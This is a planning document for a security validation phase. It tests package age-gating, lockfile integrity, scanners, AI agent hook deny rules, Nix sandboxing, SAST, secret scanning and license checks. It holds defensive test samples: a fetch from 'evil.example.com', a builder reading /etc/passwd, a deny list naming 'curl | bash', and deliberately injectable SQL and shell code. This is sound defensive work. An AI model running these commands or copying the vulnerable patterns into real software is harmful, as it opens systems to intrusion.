# Phase 21: Security Defense Validation

## Goal

Prove that every security defense layer in gdev's generated environment actually works by intentionally triggering each defense using safe test artifacts — no real malware, compromised packages, or dangerous payloads. Modeled on the EICAR test file principle: each defense layer gets a positive control test (triggers detection) and a negative control test (doesn't block legitimate operations). At the end of this phase, every defense layer has been exercised both ways and the results are tracked in a nightly CI pipeline.

## Dependencies

Phase 17 complete (test infrastructure). Phases 4-5 complete (security configs, hooks, deny rules). Phase 12 desirable (Semgrep, Gitleaks, Grype, ScanCode, container security).

## Phase Outputs

- Safe test fixtures for all 10 defense layers in `test-fixtures/security/`
- Local registry infrastructure (Verdaccio for npm, devpi for Python, distribution/distribution for OCI)
- Known-vulnerable lockfile fixtures (npm, Python, Rust, Go) with documented CVEs
- PreToolUse hook test harness (JSON-to-stdin, exit code verification)
- Nix hardening test derivations (sandbox escape, restrict-eval, allowed-uris)
- Intentionally vulnerable code samples for SAST validation
- Secret test patterns (EICAR-equivalent strings for Gitleaks)
- License compliance test fixtures (GPL/AGPL trigger packages)
- False positive regression suite (legitimate operations that must not be blocked)
- CI pipeline running all security validation tests nightly

---

### Unit 21.1: Package Manager Defense Validation — Age-Gating & Script Blocking

**Description:** Test Layer 1 (age-gating) and Layer 2 (install script blocking) together since they both need local registries. Set up ephemeral local registries (Verdaccio for npm, devpi for Python), publish canary packages, and verify that age-gating blocks freshly published packages while permitting well-established ones. Separately, verify that install script blocking prevents postinstall scripts from executing while leaving explicit user commands (`npm run build`, `npm test`, `npx`) unaffected.

**Context:** Age-gating is the single highest-impact supply chain defense — research found that 92% of malicious PyPI packages are removed within 24 hours, so a 7-day minimum release age eliminates the vast majority of threats. Install script blocking prevents the primary npm attack vector (postinstall hooks that exfiltrate credentials or install backdoors). Both defenses share a common testing dependency: a local package registry where we control package publication timestamps. Verdaccio (npm) and devpi (Python) are lightweight, open-source registries commonly used for exactly this kind of isolated testing.

**Desired Outcome:** A reproducible test suite that proves age-gating blocks fresh packages and permits old ones, and that install script blocking prevents postinstall execution while allowing explicit commands. Both registries are ephemeral (spun up per test run, torn down after).

**Steps:**
1. Set up Verdaccio local npm registry in CI (Docker container or devenv service).
2. Publish `@gdev-test/age-gate-canary` (benign empty package) to Verdaccio.
3. Attempt install with `min-release-age=10080` (7 days in minutes) — verify blocked because the package is 0 days old.
4. Attempt install of `lodash@4.17.21` (published 2021) from upstream with the same age gate — verify allowed because the package is years old.
5. Test pnpm-specific age-gating: set `minimumReleaseAge: 999999` + `minimumReleaseAgeStrict: true` in `.npmrc` — verify it blocks all recently published packages.
6. Set up devpi for Python age-gate testing via the Version-Sentinel hook's age-check logic.
7. Create `@gdev-test/script-canary` npm package with a `postinstall` script that writes `/tmp/gdev-postinstall-canary`.
8. Install `@gdev-test/script-canary` with `ignore-scripts=true` — verify the canary file is NOT created (defense works).
9. Install `@gdev-test/script-canary` WITHOUT `ignore-scripts` — verify the canary file IS created (confirms the test itself is valid).
10. Use `@lavamoat/preinstall-always-fail` (real npm package, the EICAR equivalent for script blocking): installs silently with `ignore-scripts`, fails without it.
11. Test pnpm-specific script blocking: empty `allowBuilds` list — verify build scripts are skipped for esbuild and similar native-addon packages.
12. False positive suite: verify `npm run build`, `npm test`, `npx tsc`, and other explicit user commands still work with `ignore-scripts=true` in `.npmrc`.

**Acceptance Criteria:**
- [ ] Verdaccio starts in CI, accepts publish, serves packages
- [ ] Freshly published canary package is blocked by age-gating (min-release-age=10080)
- [ ] Well-established package (lodash@4.17.21) passes age-gating
- [ ] pnpm strict age-gating (`minimumReleaseAge: 999999`) blocks recent packages
- [ ] devpi serves Python packages for age-gate hook testing
- [ ] Postinstall canary file NOT created when `ignore-scripts=true`
- [ ] Postinstall canary file IS created when `ignore-scripts` is not set (test validity check)
- [ ] `@lavamoat/preinstall-always-fail` installs silently with `ignore-scripts`, fails without
- [ ] pnpm empty `allowBuilds` skips native addon build scripts
- [ ] `npm run build`, `npm test`, `npx` all succeed with `ignore-scripts=true`

**Research Citations:**
- `artifacts/security-defense-validation-research.md § Layer 1`
- `artifacts/security-defense-validation-research.md § Layer 2`
- `research-spikes/package-supply-chain-security/quarantine-gates-research.md` — age-gating configs
- `research-spikes/package-supply-chain-security/install-sandboxing-research.md` — script blocking configs

**Status:** Not Started

---

### Unit 21.2: Lock File Enforcement Validation

**Description:** Test Layer 3 across 8 ecosystems with intentionally corrupted lock files. Each fixture is a self-contained directory containing a manifest, a corrupted lock file, and an `expect-failure.sh` script that runs the frozen-install command and asserts the expected error.

**Context:** Lock file enforcement is the last line of defense against dependency confusion and substitution attacks. If an attacker modifies a lock file to point to a malicious package, the integrity check should catch the tampered hash. If a lock file is missing, the CI install command should refuse to proceed rather than silently generating a new one. Every ecosystem has a different frozen-install command and a different error format — all 8 need independent validation.

**Desired Outcome:** All 8 lock file corruption fixtures trigger the expected failure. A parallel fixture set with valid lock files passes all frozen-install commands without error.

**Steps:**
1. Create fixture directory structure at `test-fixtures/security/lockfile-enforcement/`.
2. Create `npm-missing-lockfile/` — `package.json` only, no lock file — `npm ci` fails with "can only install with an existing package-lock.json".
3. Create `npm-tampered-hash/` — `package-lock.json` with a modified `integrity` hash — `npm ci` fails with EINTEGRITY error.
4. Create `npm-extra-dep/` — dependency present in `package.json` but not in lock file — `npm ci` fails because lock file is out of sync.
5. Create `pip-wrong-hash/` — `requirements.txt` with `--require-hashes` and an incorrect `--hash` value — `pip install` refuses to install.
6. Create `pnpm-tampered/` — modified checksum in `pnpm-lock.yaml` — `pnpm install --frozen-lockfile` fails.
7. Create `yarn-incomplete/` — `yarn.lock` missing entries for declared dependencies — `yarn install --immutable` fails.
8. Create `cargo-version-mismatch/` — `Cargo.lock` with a version that doesn't match `Cargo.toml` constraints — `cargo build --locked` fails.
9. Create `go-sum-tampered/` — `go.sum` with a fabricated hash — `go mod verify` reports SECURITY ERROR.
10. Each fixture directory contains an `expect-failure.sh` script that runs the install command, captures stderr, and asserts the expected error string is present.
11. Run as a matrix job in CI: each fixture in its own step, parallel execution.
12. Create a parallel `valid-lockfiles/` fixture set with correct lock files — run the same frozen-install commands and verify they pass.

**Acceptance Criteria:**
- [ ] `npm-missing-lockfile` fixture: `npm ci` fails with missing lock file error
- [ ] `npm-tampered-hash` fixture: `npm ci` fails with EINTEGRITY error
- [ ] `npm-extra-dep` fixture: `npm ci` fails with out-of-sync error
- [ ] `pip-wrong-hash` fixture: `pip install --require-hashes` fails with hash mismatch
- [ ] `pnpm-tampered` fixture: `pnpm install --frozen-lockfile` fails with checksum error
- [ ] `yarn-incomplete` fixture: `yarn install --immutable` fails with missing entries
- [ ] `cargo-version-mismatch` fixture: `cargo build --locked` fails with lock file out of date
- [ ] `go-sum-tampered` fixture: `go mod verify` reports SECURITY ERROR
- [ ] All 8 valid-lockfile counterparts pass their frozen-install commands
- [ ] CI runs all fixtures as a matrix job

**Research Citations:**
- `artifacts/security-defense-validation-research.md § Layer 3`
- `research-spikes/package-supply-chain-security/lockfile-integrity-research.md` — lock file enforcement configs per ecosystem

**Status:** Not Started

---

### Unit 21.3: Vulnerability Scanner Validation

**Description:** Test Layer 4 using known-vulnerable package versions that are safe to reference in lockfile manifests (never actually installed or executed). Each fixture is a lock file or manifest pointing to real packages with documented CVEs. The scanners should find the CVEs by version matching alone.

**Context:** Vulnerability scanners (OSV Scanner, Grype) are only as useful as their detection rate. False negatives — vulnerable packages that slip through — are invisible unless tested with known-vulnerable fixtures. By maintaining a curated set of packages with confirmed CVEs across all Tier 1 ecosystems, we can verify that scanner updates don't regress detection. The packages chosen are real, widely-known vulnerabilities that will persist in databases indefinitely.

**Desired Outcome:** OSV Scanner and Grype reliably detect the expected CVEs in fixture manifests. Scanning a project with all-current dependencies produces zero or near-zero findings (no false positive noise).

**Steps:**
1. Create fixture directory structure at `test-fixtures/security/known-vulnerable/`.
2. Create npm fixture (`package-lock.json`):
   - `lodash@4.17.20` — CVE-2021-23337 (command injection)
   - `minimist@1.2.5` — CVE-2021-44906 (prototype pollution, Critical 9.8)
   - `express@4.17.3` — CVE-2024-29041 (open redirect)
3. Create Python fixture (`requirements.txt`):
   - `jinja2==3.1.3`, `urllib3==1.26.17`, `requests==2.31.0`, `cryptography==41.0.7`, `flask==2.3.2`, `django==4.2.10`, `pillow==10.2.0`
4. Create Rust fixture (`Cargo.lock`):
   - `h2 0.3.24` — CVE-2024-2758 (DoS via CONTINUATION flood)
   - `hyper 0.14.27` — CVE-2024-51504 (request smuggling)
5. Create Go fixture (`go.sum`):
   - `golang.org/x/crypto v0.17.0` — CVE-2023-48795 (Terrapin SSH)
   - `golang.org/x/net v0.19.0` — CVE-2023-45288 (HTTP/2 rapid reset)
6. Run OSV Scanner against each fixture — verify CVE count meets or exceeds expected minimums (npm >= 3, Python >= 5, Rust >= 2, Go >= 2).
7. Run Grype against known-vulnerable container images: `alpine:3.9` (EOL, many CVEs) — verify `--fail-on medium` triggers failure.
8. False positive control: scan a project with all-current, up-to-date dependencies — verify zero or near-zero findings.
9. Use offline databases where possible (`osv-scanner --offline`, `grype db`) to avoid network flakiness in CI.
10. Document each CVE with its ID, severity, and affected version range in fixture README files for future maintainability.

**Acceptance Criteria:**
- [ ] OSV Scanner finds >= 3 CVEs in npm fixture
- [ ] OSV Scanner finds >= 5 CVEs in Python fixture
- [ ] OSV Scanner finds >= 2 CVEs in Rust fixture
- [ ] OSV Scanner finds >= 2 CVEs in Go fixture
- [ ] Grype fails on `alpine:3.9` with `--fail-on medium`
- [ ] False positive control: clean project scan produces zero or near-zero findings
- [ ] Offline database mode works in CI without network access
- [ ] Each fixture has a README documenting CVE IDs, severities, and expected detection counts

**Research Citations:**
- `artifacts/security-defense-validation-research.md § Layer 4`
- `artifacts/devsecops-ecosystem-research.md § 5. Vulnerability Scanning` — OSV Scanner, Grype evaluation

**Status:** Not Started

---

### Unit 21.4: Claude Code Hook & Deny Rule Validation

**Description:** Test Layer 5 by unit-testing hook scripts directly via piped JSON — no Claude Code instance needed. The PreToolUse hook protocol accepts JSON on stdin with `tool_name` and `tool_input` fields, returning exit 0 (allow) or exit 2 (block). All 48 deny rules are tested with both blocked and allowed commands.

**Context:** Claude Code hooks are the innermost defense layer — they run inside the AI agent's tool-use loop and can block dangerous operations in real time. Testing them traditionally would require a running Claude Code instance, which is slow, expensive, and non-deterministic. Instead, the hook scripts are pure functions (JSON in, exit code out) that can be tested directly by piping crafted JSON to stdin and checking the exit code. This makes them fast, deterministic, and CI-friendly.

**Desired Outcome:** Every hook script and deny rule is covered by at least one positive test (blocks dangerous input) and one negative test (allows legitimate input). The test harness is reusable for future hook development.

**Steps:**
1. Build a test harness script that accepts: hook script path, JSON input, expected exit code. Runs the hook, asserts the exit code, reports pass/fail.
2. Test attach-guard hook (package install interception):
   - Block: `{"tool_name": "Bash", "tool_input": {"command": "npm install lodash@4.17.19"}}` — exit 2 (triggers age check or known-vulnerable check)
   - Allow: `{"tool_name": "Bash", "tool_input": {"command": "npm install is-odd@3.0.1"}}` — exit 0 (established package)
   - Block: `{"tool_name": "Bash", "tool_input": {"command": "pip install some-new-package==0.0.1"}}` — exit 2 (recent, fails age check)
3. Test version-sentinel hook (manifest change detection):
   - Block: `{"tool_name": "Write", "tool_input": {"file_path": "package.json", "content": "..."}}` where content includes dependency changes — exit 2
   - Allow: `{"tool_name": "Write", "tool_input": {"file_path": "README.md", "content": "..."}}` — exit 0
   - Block: `{"tool_name": "Edit", "tool_input": {"file_path": "Cargo.toml", "old_string": "...", "new_string": "..."}}` adding a new dependency — exit 2
   - Allow: `{"tool_name": "Read", "tool_input": {"file_path": "package.json"}}` — exit 0
4. Test all 48 deny rules systematically:
   - Blocked commands: `curl ... | bash`, `pip install --no-deps`, `npm install --no-save`, `cargo install --force`, `gem install`, `composer require --no-scripts`, `go install ...@latest`, `brew install --cask`
   - Allowed commands: `npm test`, `pip --version`, `cargo build`, `go build`, `ls -la`, `git status`
5. Build a false positive suite of 50+ common legitimate development commands and verify none are blocked.
6. Generate a coverage report: number of deny rules tested / total deny rules, with any untested rules flagged.

**Acceptance Criteria:**
- [ ] Test harness accepts hook path + JSON input + expected exit code and reports pass/fail
- [ ] attach-guard blocks dangerous package installs and allows safe ones
- [ ] version-sentinel blocks manifest writes with dependency changes and allows non-manifest writes
- [ ] All 48 deny rules tested with at least one blocked command each
- [ ] All 48 deny rules tested with at least one allowed command each
- [ ] False positive suite: 50+ common legitimate commands pass without blocking
- [ ] Coverage report shows 48/48 deny rules tested
- [ ] Test harness is reusable for future hook development

**Research Citations:**
- `artifacts/security-defense-validation-research.md § Layer 5`
- `research-spikes/claude-code-agent-package-guardrails/reference-hook-script.py` — PreToolUse hook protocol
- `research-spikes/claude-code-agent-package-guardrails/reference-deny-rules.md` — 48 deny rules

**Status:** Not Started

---

### Unit 21.5: Nix Hardening & SAST Validation

**Description:** Test Layer 6 (Nix sandbox and evaluation hardening) and Layer 7 (Semgrep SAST) with purpose-built test derivations and intentionally vulnerable code samples. Nix tests verify that the hardened nix.conf settings actually prevent sandbox escapes, unrestricted evaluation, and unauthorized URL fetching. Semgrep tests verify detection of known vulnerability patterns across 3 ecosystems.

**Context:** Nix's security model relies on configuration settings (`restrict-eval`, `allowed-uris`, `sandbox`, `require-sigs`) that are easy to set but hard to verify — a misconfigured nix.conf silently weakens all guarantees. Test derivations that intentionally attempt forbidden operations are the only way to confirm the settings are effective. Semgrep's value depends on rule coverage — intentionally vulnerable code with Semgrep's native `# ruleid:` / `# ok:` annotations provides built-in test infrastructure that validates detection without external tooling.

**Desired Outcome:** All 5 Nix hardening settings are verified via test derivations that fail when the setting is active. All intentionally vulnerable code patterns are detected by Semgrep with zero false negatives on annotated test files.

**Steps:**
1. Create 5 Nix hardening test derivations in `test-fixtures/security/nix-hardening/`:
   - `restrict-eval-test.nix`: uses `builtins.readFile /etc/hostname` — fails with "access to path '/etc/hostname' is forbidden by restricted evaluation"
   - `allowed-uris-test.nix`: uses `builtins.fetchurl "https://evil.example.com/payload.tar.gz"` — fails with "URI 'https://evil.example.com/...' is not allowed"
   - `sandbox-escape-test.nix`: derivation builder runs `cat /etc/passwd` — gets empty output or "No such file or directory" (sandbox isolation)
   - `require-sigs-test.nix`: attempts substitution from an unsigned binary cache — fails with signature verification error
   - `sandbox-network-test.nix`: non-fixed-output derivation attempts `curl https://example.com` — fails because sandbox blocks network access for non-FOD derivations
2. Each test derivation has a wrapper script that runs `nix-build` (or `nix build`) and asserts the expected error message appears in stderr.
3. Create intentionally vulnerable code samples in `test-fixtures/security/sast-samples/`:
   - Python: SQL injection (`cursor.execute("SELECT * FROM users WHERE id=" + user_id)`), command injection (`os.system("ls " + user_input)`), path traversal, SSRF
   - JavaScript: XSS (`document.innerHTML = user_input`), prototype pollution (`Object.assign(target, user_input)`), unsafe regex, eval usage
   - Go: SQL injection (`db.Query("SELECT * FROM users WHERE id=" + id)`), command injection (`exec.Command("sh", "-c", user_input)`)
4. Annotate each vulnerable line with Semgrep's `# ruleid: <rule-id>` comment (Python/Go) or `// ruleid: <rule-id>` (JS).
5. Include safe counterpart code annotated with `# ok: <rule-id>` to verify no false positives.
6. Run `semgrep --test` against the annotated test files — verify all `ruleid` lines are detected and all `ok` lines are not flagged.
7. Run Semgrep with ecosystem-appropriate rule sets from Phase 12 (`p/python`, `p/javascript`, `p/golang`, `p/owasp-top-ten`).

**Acceptance Criteria:**
- [ ] `restrict-eval` test derivation fails with "access forbidden" error
- [ ] `allowed-uris` test derivation fails with "URI not allowed" error
- [ ] Sandbox escape test derivation cannot read `/etc/passwd`
- [ ] `require-sigs` test derivation fails on unsigned substitution
- [ ] Sandbox network test derivation cannot reach external URLs
- [ ] Semgrep detects all SQL injection patterns (Python, Go)
- [ ] Semgrep detects all command injection patterns (Python, Go)
- [ ] Semgrep detects all XSS patterns (JavaScript)
- [ ] Semgrep detects prototype pollution pattern (JavaScript)
- [ ] `semgrep --test` passes: all `ruleid` annotations trigger, all `ok` annotations are clean
- [ ] False positive control: safe code patterns are not flagged

**Research Citations:**
- `artifacts/security-defense-validation-research.md § Layer 6`
- `artifacts/security-defense-validation-research.md § Layer 7`
- `research-spikes/devenv-security/nix-conf-hardening-research.md` — 10 nix.conf security settings
- `artifacts/devsecops-ecosystem-research.md § 2. SAST` — Semgrep rule sets

**Status:** Not Started

---

### Unit 21.6: Secret Scanning & Container Security Validation

**Description:** Test Layer 8 (Gitleaks secret scanning) and Layer 9 (Grype + Syft + Cosign container security pipeline) using EICAR-equivalent test strings for secrets and known-vulnerable container images for scanning.

**Context:** Secret scanning must balance sensitivity (catching real leaks) against specificity (not blocking legitimate operations). The test strings used here are well-known example/invalid keys from official documentation — they match the regex patterns that scanners use but are not valid credentials. This is the same principle as the EICAR test file for antivirus: it triggers detection without posing a real threat. Container security testing uses EOL images with known CVE counts, plus a sign/verify round-trip to validate the Cosign integrity chain.

**Desired Outcome:** Gitleaks blocks commits containing test secret patterns and produces SARIF reports. Grype detects vulnerabilities in EOL container images. Cosign sign/verify round-trips succeed on a local registry. Allowlists correctly suppress known false positives.

**Steps:**
1. Create secret test fixtures in `test-fixtures/security/secret-patterns/`:
   - AWS example keys: `AKIAIOSFODNN7EXAMPLE` + `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY` (from AWS documentation)
   - GitHub PAT: `ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef01` (valid format, invalid token)
   - Stripe test key: `sk_test_4eC39HqLyjWDarjtT1zdp7dc` (from Stripe documentation)
   - Slack token: `xoxb-000000000000-000000000000-XXXXXXXXXXXXXXXXXXXXXXXX`
   - RSA private key: `-----BEGIN RSA PRIVATE KEY-----` block (generated test key, immediately discarded)
   - Anthropic API key: `sk-ant-api03-XXXXXXXXXX...` (valid format, invalid key)
2. Test Gitleaks pre-commit hook: stage file with test secrets, attempt commit — verify hook blocks with non-zero exit and outputs matched patterns.
3. Test Gitleaks CI mode: run `gitleaks detect --source . --report-format sarif` — verify SARIF report contains expected findings.
4. Test Gitleaks allowlist: add internal registry URLs to `.gitleaks.toml` allowlist — verify they are not flagged as secrets.
5. Test Grype container scanning: `grype alpine:3.9 --fail-on medium` — verify failure (EOL image with many known CVEs).
6. Test Syft SBOM generation: `syft alpine:3.9 -o cyclonedx-json` — verify valid CycloneDX JSON output with expected package list.
7. Test Cosign sign/verify round-trip:
   - Start local `registry:2` (distribution/distribution) container
   - Build and push a minimal test image
   - `cosign sign` the image (keyless or with generated test key)
   - `cosign verify` the signed image — verify round-trip succeeds
   - Attempt `cosign verify` on unsigned image — verify failure
8. Test deliberately vulnerable Dockerfile fixture: `FROM node:14-alpine` (EOL Node 14 + EOL Alpine) — scan with Grype, verify high-severity findings.
9. False positive control: scan `alpine:latest` — verify minimal or no high-severity findings.

**Acceptance Criteria:**
- [ ] Gitleaks pre-commit hook blocks commit containing AWS example keys
- [ ] Gitleaks pre-commit hook blocks commit containing GitHub PAT format
- [ ] Gitleaks pre-commit hook blocks commit containing Stripe test key
- [ ] Gitleaks pre-commit hook blocks commit containing private key block
- [ ] Gitleaks CI mode produces valid SARIF report with expected findings
- [ ] Gitleaks allowlist correctly suppresses internal registry URLs
- [ ] `grype alpine:3.9 --fail-on medium` triggers failure
- [ ] `syft alpine:3.9 -o cyclonedx-json` produces valid CycloneDX SBOM
- [ ] Cosign sign/verify round-trip succeeds on local registry
- [ ] Cosign verify fails on unsigned image
- [ ] Deliberately vulnerable Dockerfile fixture triggers Grype findings
- [ ] `alpine:latest` scan produces minimal high-severity findings

**Research Citations:**
- `artifacts/security-defense-validation-research.md § Layer 8`
- `artifacts/security-defense-validation-research.md § Layer 9`
- `artifacts/devsecops-ecosystem-research.md § 3. Secret Scanning` — Gitleaks patterns
- `artifacts/devsecops-ecosystem-research.md § 4. Container Security` — Grype + Syft evaluation
- `artifacts/artifact-stores-caches-research.md § SBOM and Provenance Tools` — Syft + Cosign

**Status:** Not Started

---

### Unit 21.7: License Compliance & Regression Suite

**Description:** Test Layer 10 (ScanCode license compliance) and establish the ongoing regression suite that bundles all defense validation tests into a nightly CI pipeline with drift detection.

**Context:** License compliance is the only defense layer that protects against legal risk rather than security risk, but the testing pattern is identical: known inputs with expected outputs. The regression suite is the cross-cutting deliverable that ties all 10 defense layers together — it ensures that future changes to gdev's generated configs don't silently disable defenses. A defense that stops triggering its positive control test is a regression, and the nightly pipeline catches it before it reaches developers.

**Desired Outcome:** ScanCode correctly categorizes licenses per the firm's policy (MIT/Apache allowed, GPL/AGPL blocked, LGPL/MPL review). The nightly CI pipeline runs all defense validation tests from Units 21.1-21.7, tracks results over time, and flags any defense that stops triggering.

**Steps:**
1. Create license test fixtures in `test-fixtures/security/license-compliance/`:
   - Allowed licenses: files with MIT, Apache-2.0, BSD-3-Clause, ISC headers — verify ScanCode passes
   - Blocked licenses: files with GPL-3.0, AGPL-3.0 headers — verify ScanCode flags them per policy
   - Review licenses: files with LGPL-2.1, MPL-2.0 headers — verify ScanCode marks for review
2. Create npm fixture with `readline` package as a dependency (GPL-3.0 licensed) — verify ScanCode flags the GPL dependency.
3. Verify `.scancode.yml` policy correctly categorizes all license families per the firm's standard (MIT/Apache/BSD/ISC allowed, GPL/AGPL blocked, LGPL/MPL review).
4. False positive control: project with only MIT and Apache-2.0 dependencies — verify clean scan with no policy violations.
5. Test `.license-exceptions.yml` override: add a justified exception for a specific GPL dependency — verify ScanCode honors the exception.
6. Bundle all defense tests from Units 21.1-21.6 into a single nightly CI workflow (`security-validation.yml`):
   - Job matrix: one job per defense layer (10 layers, parallelized)
   - Each job runs both positive control (triggers defense) and negative control (allows legitimate operation)
   - Results collected as CI artifacts (SARIF reports, test output logs)
7. Track results over time:
   - Each nightly run records pass/fail per defense layer
   - Any defense that previously passed but now fails is flagged as a regression
   - CI step that compares current results against baseline and fails on regression
8. Establish quarterly update schedule:
   - Review known-vulnerable package versions — update CVE fixtures as patches release and new CVEs are published
   - Review Gitleaks test patterns — add new secret formats as cloud providers change key formats
   - Review Semgrep rules — update annotations when rule IDs change
   - Update container image tags if EOL images are removed from registries
9. Map each defense layer to OWASP ASVS requirements:
   - V14 (Configuration): age-gating, install scripts, Nix hardening
   - V10 (Malicious Code): deny rules, hooks, vulnerability scanning
   - V1 (Architecture): lock file enforcement, container security, license compliance
   - V2 (Authentication): secret scanning
   - Document the mapping in the regression suite README for audit traceability

**Acceptance Criteria:**
- [ ] ScanCode flags GPL-3.0 and AGPL-3.0 files per policy
- [ ] ScanCode allows MIT, Apache-2.0, BSD-3-Clause, ISC files
- [ ] ScanCode marks LGPL-2.1 and MPL-2.0 files for review
- [ ] npm fixture with `readline` (GPL-3.0) dependency triggers policy violation
- [ ] Clean project with only MIT/Apache deps produces no policy violations
- [ ] `.license-exceptions.yml` override correctly suppresses flagged dependency
- [ ] Nightly CI workflow runs all 10 defense layers in parallel
- [ ] Each defense layer has both positive and negative control tests in the pipeline
- [ ] Regression detection: previously passing defense that now fails triggers CI failure
- [ ] Quarterly update schedule documented with specific review checklist
- [ ] OWASP ASVS mapping documented for all 10 defense layers
- [ ] Nightly pipeline completes in under 30 minutes

**Research Citations:**
- `artifacts/security-defense-validation-research.md § Layer 10`
- `artifacts/security-defense-validation-research.md § Cross-Cutting: Security Test Pyramid`
- `artifacts/security-defense-validation-research.md § Cross-Cutting: OWASP Testing Guidelines`
- `artifacts/devsecops-ecosystem-research.md § 6. License Compliance` — ScanCode evaluation

**Status:** Not Started

---

## Phase Completion Criteria

- [ ] All seven units pass acceptance criteria
- [ ] All 10 defense layers have at least one positive control test (triggers defense)
- [ ] All 10 defense layers have at least one negative control test (allows legitimate operation)
- [ ] Age-gating blocks canary package on npm (Verdaccio) and pnpm
- [ ] Install script blocking prevents `@lavamoat/preinstall-always-fail` from executing
- [ ] All 8 lock file corruption fixtures trigger expected failures
- [ ] OSV Scanner finds >= 3 CVEs in npm fixture, >= 5 in Python fixture
- [ ] Grype fails on `alpine:3.9` with `--fail-on medium`
- [ ] All 48 deny rules block their target commands and allow legitimate commands
- [ ] Nix sandbox blocks `/etc/passwd` access and disallowed URL fetch
- [ ] Semgrep detects all intentionally vulnerable code patterns
- [ ] Gitleaks blocks commits containing test secret patterns
- [ ] Cosign sign/verify round-trip succeeds on local registry
- [ ] ScanCode flags GPL-3.0 dependency per policy config
- [ ] Nightly CI pipeline runs complete security validation suite
- [ ] No false positives: all legitimate operations in the false positive suite pass
